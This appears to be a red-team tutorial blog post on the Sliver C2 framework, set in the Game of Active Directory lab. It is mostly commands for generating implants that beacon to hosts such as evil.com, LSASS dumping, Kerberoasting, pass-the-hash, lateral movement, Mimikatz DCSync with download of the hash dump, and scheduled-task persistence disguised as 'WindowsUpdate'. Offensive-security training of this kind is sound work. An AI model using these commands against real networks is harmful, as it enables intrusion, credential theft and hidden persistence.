---
layout: post
title: "10 Days of AD Security: Day 7 - Sliver"
date: 2026-02-11
category: Active Directory Security
author: James Wells
excerpt: "Day 7: Sliver C2 framework by BishopFox — cross-platform implants, mTLS/DNS/HTTP beacons, and BOF execution."
tags: [Sliver, C2, Red Team, AD Security Series]
---
## History and Overview

Sliver is an open-source command and control (C2) framework developed and maintained by BishopFox, one of the leading offensive security firms. Released in 2019, Sliver was created to provide red teams and penetration testers with a modern, capable alternative to commercial C2 platforms like Cobalt Strike. Written in Go, Sliver supports cross-platform operations across Windows, Linux, and macOS, with implants that can communicate over mutual TLS (mTLS), HTTP(S), DNS, and WireGuard. What distinguishes Sliver from other C2 frameworks is its focus on operational security (OPSEC), featuring strong encryption by default, minimal forensic footprints, and in-memory execution capabilities. By Q2 2025, Kaspersky reported Sliver as the most-used C2 framework in actual attacks, surpassing even Cobalt Strike—a testament to its effectiveness and the impact of Fortra's Operation Morpheus which reduced unauthorized Cobalt Strike copies by 80%. With 10.9k GitHub stars and active development, Sliver includes advanced features like process injection, DPAPI credential extraction, Kerberoasting, token manipulation, and BOF (Beacon Object File) execution compatibility. Its multi-user server architecture allows red team collaboration, and the framework's modular design enables custom extensions through armory packages.

## Download and Installation

**Official Source:** [https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)

**Installation:**

```bash
# Linux Installation
curl https://sliver.sh/install|sudo bash

# Or via package manager (Kali Linux)
sudo apt update
sudo apt install sliver

# macOS Installation
brew install sliver

# Verify installation
sliver-server version
```

**Starting the Server:**

```bash
# Start Sliver server daemon
sliver-server

# Or run in daemon mode
sliver-server daemon

# Connect as client
sliver-client
```

**Multi-User Setup:**

```bash
# Generate operator config for team members
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.cfg

# Team members connect using config
sliver-client import /tmp/alice.cfg
```

## When to Use Sliver

Use Sliver when you need to:
- **Maintain persistent access**: Long-term C2 communication during red team engagements
- **Perform post-exploitation**: Execute commands, scripts, and tools on compromised hosts
- **Lateral movement**: Use stolen credentials across network infrastructure
- **Credential harvesting**: Extract passwords, hashes, and tokens from memory
- **Active Directory attacks**: Built-in Kerberoasting, token manipulation, registry operations
- **Collaborative operations**: Multiple operators on same engagement with shared session access
- **OPSEC-focused engagements**: Encrypted communications and in-memory execution
- **Cross-platform operations**: Unified C2 for Windows, Linux, and macOS targets
- **Avoid Cobalt Strike detection**: Evade signatures and behavioral analytics tuned for CS

Sliver is primarily used after initial access has been achieved, providing the infrastructure for the entire post-exploitation phase of an engagement.

## Walkthrough

**Phase 1: Generate Implant**

```bash
# Start Sliver console
sliver

# Generate Windows HTTPS implant
generate --http example.com --os windows --arch amd64 --save /tmp/implant.exe

# Generate with multiple protocols (fallback)
generate --mtls 192.168.1.100:8888 --http example.com --dns evil.com --os windows --save /tmp/resilient.exe

# Generate Linux implant
generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --save /tmp/implant.elf

# Generate shellcode for injection
generate --mtls 192.168.1.100:8888 --format shellcode --save /tmp/implant.bin
```

**Phase 2: Start Listeners**

```bash
# HTTPS listener (requires valid or self-signed cert)
https --lport 443 --domain example.com

# mTLS listener (most secure)
mtls --lport 8888

# DNS listener (firewall evasion)
dns --domains evil.com,backup.evil.com --no-canaries
```

**Phase 3: Session Interaction**

```bash
# Wait for implant to connect
# Use 'sessions' to view active sessions
sessions

# Interact with a session
use [session-id]

# Get system information
info

# Check privileges
getprivs

# Execute commands
shell whoami
shell ipconfig /all
```

**Phase 4: Active Directory Operations**

**Credential Harvesting:**
```bash
# Process dumping and credential extraction
procdump -n lsass.exe -s /tmp/lsass.dmp

# Kerberoasting
kerberoast

# Token manipulation
make-token domain\user password
rev2self  # Revert to original token

# Steal token from process
steal-token [pid]
```

**Lateral Movement:**
```bash
# Execute commands remotely (requires credentials)
exec-wmi -u domain\user -p password -h 192.168.1.50 -c "whoami"

# Use PSExec-style execution
psexec -u domain\user -p password -h 192.168.1.50

# Pass-the-hash
exec-wmi -u domain\user -H [NTLM hash] -h 192.168.1.50 -c "powershell.exe"
```

**Port Forwarding:**
```bash
# Forward remote port to local
portfwd add --remote 192.168.1.50:3389 --bind 127.0.0.1:3389

# Access via localhost
# rdesktop 127.0.0.1
```

**Phase 5: Evasion and Stealth**

```bash
# Process injection
migrate [target-pid]

# Spawn sacrificial process
spawndll -p c:\windows\system32\notepad.exe

# In-memory .NET assembly execution
execute-assembly /path/to/Rubeus.exe kerberoast

# BOF execution (Beacon Object Files)
inline-execute /path/to/bof.o [args]
```

**Phase 6: File Operations**

```bash
# Upload files
upload /local/path/tool.exe C:\Windows\Temp\tool.exe

# Download files
download C:\Users\admin\Documents\passwords.txt /tmp/passwords.txt

# Screenshot
screenshot
```

## Game of Active Directory Lab Example

Using Sliver in the GOAD environment:

**Scenario: Complete Post-Exploitation Chain**

1. **Initial Access**: Delivered Sliver implant via phishing simulation

2. **Establish C2**:
   ```bash
   # On attack box
   sliver
   mtls --lport 8888

   # Wait for connection from GOAD workstation
   sessions
   use [session]
   ```

3. **Enumeration**:
   ```bash
   # System information
   info

   # Check if we're in GOAD domain
   shell nltest /domain_trusts

   # Output shows North, Essos, Meereen domains
   ```

4. **Credential Harvesting**:
   ```bash
   # Check for cached credentials
   shell cmdkey /list

   # Kerberoast available SPNs
   kerberoast

   # Discovers jon.snow with SPN
   # Save ticket for offline cracking
   ```

5. **Privilege Escalation**:
   ```bash
   # After cracking jon.snow password
   make-token north.sevenkingdoms.local\jon.snow CrackedPassword123

   # Verify elevated context
   shell whoami /groups
   ```

6. **Lateral Movement to DC**:
   ```bash
   # PSExec to domain controller
   psexec -u north\jon.snow -p CrackedPassword123 -h 192.168.56.11

   # New session established on Winterfell (DC)
   ```

7. **Domain Compromise**:
   ```bash
   # From DC session
   upload /tools/Mimikatz.exe C:\Windows\Temp\m.exe

   shell C:\Windows\Temp\m.exe "privilege::debug" "lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv" "exit" > dcsync.txt

   download C:\Windows\Temp\dcsync-results.txt /loot/north-hashes.txt
   ```

8. **Persistence**:
   ```bash
   # Create scheduled task for implant persistence
   shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\sliver.exe" /sc onstart /ru SYSTEM
   ```

9. **Cross-Domain Pivot**:
   ```bash
   # Use trust relationships to access Essos
   make-token essos.local\administrator PasswordFromDCSync

   psexec -h 192.168.56.12
   ```

**GOAD-Specific Sliver Use Cases:**
- Maintain persistent access to GOAD infrastructure during multi-day engagements
- Coordinate multi-operator attacks across GOAD's 5 domains
- Use built-in Kerberoasting without dropping additional tools
- Demonstrate real-world C2 communications and detection challenges
- Test GOAD's monitoring capabilities with encrypted C2 traffic

## Conclusion

Sliver represents the maturation of open-source C2 frameworks, rivaling and in some metrics surpassing commercial alternatives. Its rise to become the most-detected C2 in real attacks demonstrates both its effectiveness and widespread adoption. For red teams and penetration testers, Sliver offers enterprise-grade C2 capabilities without licensing costs, with active development ensuring compatibility with modern operating systems and security controls.

In the GOAD lab environment, Sliver provides a realistic simulation of advanced persistent threat operations. Its built-in AD attack capabilities, multi-protocol communications, and collaborative features make it ideal for comprehensive red team exercises. Understanding Sliver is crucial for both offensive practitioners building realistic attack scenarios and defensive teams preparing detection and response capabilities.

The framework's open-source nature allows customization and extension, while BishopFox's continued investment ensures Sliver remains at the forefront of C2 technology.

**Next in this series:** Day 8 will cover Responder, the LLMNR/NBT-NS/mDNS poisoner that enables credential capture and NTLM relay attacks.
